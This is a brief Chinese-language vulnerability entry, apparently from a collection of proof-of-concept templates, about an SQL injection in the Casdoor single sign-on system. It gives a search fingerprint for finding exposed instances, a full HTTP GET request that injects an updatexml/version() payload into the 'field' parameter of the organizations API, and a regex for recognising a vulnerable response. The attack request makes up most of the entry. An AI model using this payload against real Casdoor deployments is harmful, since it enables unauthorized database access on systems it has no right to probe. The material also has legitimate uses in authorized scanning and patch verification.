# Casdoor单点登录系统SQL注入漏洞

Casdoor ｜ SQL注入 ｜ —
- **指纹**：`title="Casdoor"`
- **请求**：`GET /api/get-organizations?p=123&pageSize=123&value=cfx&sortField&sortOrder&field=updatexml(null,version(),null) HTTP/1.1`
- **响应特征**：200 ^(?=.*?syntax)(?=.*?error).*?$